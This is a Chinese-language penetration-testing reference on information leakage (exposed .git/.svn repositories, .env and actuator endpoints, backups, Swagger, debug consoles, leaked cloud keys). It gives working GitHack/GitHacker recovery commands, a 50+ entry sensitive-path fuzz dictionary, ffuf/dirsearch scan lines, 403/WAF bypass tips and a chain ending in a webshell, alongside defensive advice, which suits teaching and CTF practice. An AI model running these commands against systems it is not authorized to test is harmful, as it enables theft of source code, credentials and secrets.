# 信息泄露

## 一句话理解
信息泄露本身很少"致命"，但它是几乎所有攻击链的第一步：源码、配置、密钥、接口文档任何一样泄露，都可能把黑盒测试变成白盒审计，把无入口变成有入口。

## 核心特点
- 单看评级低，组合起来杀伤力大：`.git` -> 源码 -> 审计出 RCE -> 配置文件 -> 数据库 -> 内网
- 自动化程度高，适合批量收割（SRC 常见）
- 防御方最容易忽视：上线忘删、备份随手放、debug 忘关

## 常见类型
### 1. 源码泄露
| 类型 | 路径/特征 | 利用 |
| --- | --- | --- |
| Git | `/.git/HEAD`、`/.git/config` | [GitHack](https://github.com/lijiejie/GitHack)、[GitHacker](https://github.com/WangYihang/GitHacker) 还原完整仓库 |
| SVN | `/.svn/entries`、`/.svn/wc.db` | [dvcs-ripper](https://github.com/kost/dvcs-ripper) |
| .DS_Store | `/.DS_Store` | [ds_store_exp](https://github.com/lijiejie/ds_store_exp) 还原目录结构 |
| IDE 配置 | `/.idea/`、`.vscode/`、`*.sublime-project` | 泄露路径、部署信息 |
| 备份文件 | `index.php.bak`、`index.php~`、`index.php.swp`、`www.zip`、`backup.tar.gz` | 直接下载源码 |
| 编辑器临时文件 | Vim 异常退出残留 `.swp/.swo` | 还原文件内容 |

### 2. 配置泄露
- `.env`：数据库口令、AKSK、SMTP、JWT 密钥
- Java：`/WEB-INF/web.xml`、`application.yml`、`bootstrap.properties`
- `.htaccess`、`web.config`、`config.php.swp`
- Spring Boot Actuator：`/actuator/env`、`/actuator/heapdump`（堆 dump 里能翻出口令）

### 3. 接口与文档泄露
- Swagger / OpenAPI：`/swagger-ui.html`、`/v2/api-docs`、`/v3/api-docs`
- GraphQL 内省：`__schema` 查询拿到全部类型定义（关掉 introspection 也难挡字段爆破）
- 接口文档站：Yapi、Apidoc 未授权访问

### 4. 调试信息泄露
- 报错堆栈：泄露绝对路径、框架版本、SQL 语句
- `phpinfo()`：环境变量、模块、路径全泄露
- Flask/Werkzeug debug：`/console` 可交互执行（结合 PIN 计算可 RCE）
- Django `DEBUG=True`：配置、SQL、代码片段全展示

### 5. 前端泄露
- JS 里的硬编码密钥、内网地址、接口路径
- Sourcemap（`.js.map`）：还原前端源码
- HTML 注释里的测试账号、TODO

### 6. 云密钥泄露
- GitHub/Gitee 搜索 `AKID`、`AccessKeyId`、`SecretAccessKey`、`LTAI`（阿里云 AK 前缀）
- APK/小程序反编译、JS bundle 里翻 AKSK -> 接 [PEN-Cloud](../penetration/PEN-Cloud.md)

## 快速判断
1. 敏感路径 fuzz：`/.git/HEAD` 返回 `ref:`、`/.svn/entries` 有内容、`.DS_Store` 是二进制小文件
2. 状态码语义：200/403/404 分别代表"可读/存在但禁读/不存在"，403 也值得换姿势再试
3. 报错触发：传非法参数、超长输入、类型错误，看是否回显堆栈
4. 指纹联动：识别出 Spring 就测 actuator，识别出 PHP 就测 phpinfo 和 `.swp`

## .git 泄露恢复实操

前提：`/.git/HEAD` 返回 `ref: refs/heads/master` 之类内容，说明仓库结构在线。三种姿势从快到全，按需选择。

### 1. GitHack（快速验证够用）

```bash
# 用法：URL 指向 .git 目录，工具按已知文件名递归下载并还原工作区
python GitHack.py http://target/.git/

# 结果保存在以目标域名命名的目录中，可直接翻源码
# 局限：只能恢复当前 HEAD 指向的版本，历史提交 / stash / 已删除文件拿不到
```

### 2. GitHacker（推荐，可恢复完整历史）

```bash
# 拉取全部 objects（松散对象 + pack 打包对象），输出到 result 目录
python githacker.py --output-dir result http://target/.git/

# 进入恢复出的仓库
cd result/target

# 查看全部提交（含 HEAD 之外的游离提交）
git log --all

# 翻 stash：开发调试现场常直接藏着密钥 / 内网地址
git stash list

# 切到任意历史版本，找回"已删除"的敏感文件
git checkout <commit-hash>
```

实战要点：CTF 常把 flag 放在历史版本里被删除的文件中，`git log --all` 定位删除前的 commit 再 `git checkout` 过去即可；`git diff HEAD^ HEAD` 直接看最近一次改动。

### 3. 手工分析（工具失灵时兜底）

```bash
# ① 解析 .git/index：无需完整仓库，拿到 index 文件即可读出文件清单 + 每个文件的 SHA-1
git ls-files -s
# 输出形如：
# 100644 3b18e512dfd84f50c1e4d0e5b1a2b3c4d5e6f7a8 0    application/config/database.php

# ② 按 SHA-1 定位对象
#    松散对象：.git/objects/<sha1 前 2 位>/<sha1 后 38 位>（zlib 压缩）
#    打包对象：.git/objects/pack/*.pack（GitHacker 会自动解开）

# ③ 手动解压单个松散对象（git 命令不可用时）
python -c "import zlib,sys;d=open('objects/3b/18e512...','rb').read();sys.stdout.buffer.write(zlib.decompress(d))"

# ④ 按时间戳恢复删除文件的思路：
#    git fsck --lost-found    # 列出 dangling（游离）的 blob / commit
#    git show <blob-hash>     # 逐个翻内容，定位被删掉的敏感文件
#    git cat-file -p <hash>   # 查看任意对象的原始内容
```

常见坑：
- 服务器对 `.git/` 目录 403（禁止列目录）不影响利用——工具是按已知文件名硬猜的
- 部分环境 `.git/index` 可读但 objects 目录被拦，此时只能拿到文件名清单，走 ③ 手动解
- 恢复完重点翻：`config`、`.env`、`*.sql`、`web.xml`、历史 diff、stash

## 工具
- 目录扫描：dirsearch、ffuf、dirmap（配合 [PEN-Scanner](../penetration/PEN-Scanner.md)）
- Git 利用：GitHack、GitHacker、git-dumper
- 备份扫描：常见后缀字典 `bak/backup/swp/swo/old/zip/tar.gz/sql`

### 探测路径字典

常用泄露路径清单（30+ 条，按目标技术栈裁剪后喂给 fuzz 工具）：

```text
# 版本控制
/.git/HEAD
/.git/config
/.svn/entries
/.svn/wc.db
/.hg/store/data
/.bzr/checkout

# 环境 / 配置
/.env
/.env.bak
/.env.save
/web.config
/WEB-INF/web.xml
/WEB-INF/classes/application.yml
/application.yml
/application.properties
/bootstrap.properties
/config.php.bak
/.htaccess

# 备份 / 压缩包 / 数据库导出
/www.zip
/backup.zip
/backup.tar.gz
/source.zip
/db.sql
/backup.sql
/database.sql
/index.php.bak
/index.php~
/index.php.swp
/admin.php.bak

# IDE / 编辑器 / 系统残留
/.idea/workspace.xml
/.idea/config.xml
/.vscode/sftp.json
/.project
/.DS_Store
/Thumbs.db

# 接口文档
/swagger-ui.html
/swagger-ui/
/v2/api-docs
/v3/api-docs
/doc.html
/api-docs
/graphql

# Java 运维 / 监控
/actuator
/actuator/env
/actuator/heapdump
/actuator/mappings
/actuator/configprops
/druid/index.html
/console

# 调试 / 信息收集
/phpinfo.php
/info.php
/test.php
/server-status
/robots.txt
/crossdomain.xml
/.well-known/security.txt
```

### fuzz 工具

```bash
# ffuf：FUZZ 标记字典注入点，-fc 过滤状态码，-t 并发线程，-r 递归扫描
ffuf -w dict.txt -u https://target.com/FUZZ -fc 404 -t 50 -r -recursion-depth 2

# dirsearch：-e 批量追加扩展名（自动组合出 index.php.bak 之类的候选）
dirsearch -u https://target.com -e php,bak,zip,tar.gz,sql,txt,html -t 30

# feroxbuster：Rust 实现、速度快，-s 只保留指定状态码，--depth 控制递归深度
feroxbuster -u https://target.com -w dict.txt -s 200,204,301,302,403 --depth 2
```

提示：403 ≠ 放弃，`/.git/config` 403 时换大小写、双斜杠、`%2e` 编码、路径末尾补空格再试；有 WAF 时对字典路径做编码混淆。

## 利用链示例（CTF 常见）

```text
/.git 泄露 -> 还原源码 -> 发现 config.php 数据库口令
         -> 审计出反序列化入口 -> 写入 webshell -> getshell
```

## 防御要点
- Web 根目录禁放 `.git/.svn`，CI/CD 构建产物与版本库分离
- 线上关闭 debug、actuator 最小化暴露、错误页统一
- 备份文件移出 Web 目录，密钥进 KMS/环境变量而非仓库
- 网关层拦截敏感路径（`.git`、`.env`、`actuator`）

## 参考
- [OWASP - Information Leakage](https://owasp.org/www-community/vulnerabilities/Information_Leakage)
- [GitHack - GitHub](https://github.com/lijiejie/GitHack)
- [GitHacker - GitHub](https://github.com/WangYihang/GitHacker)
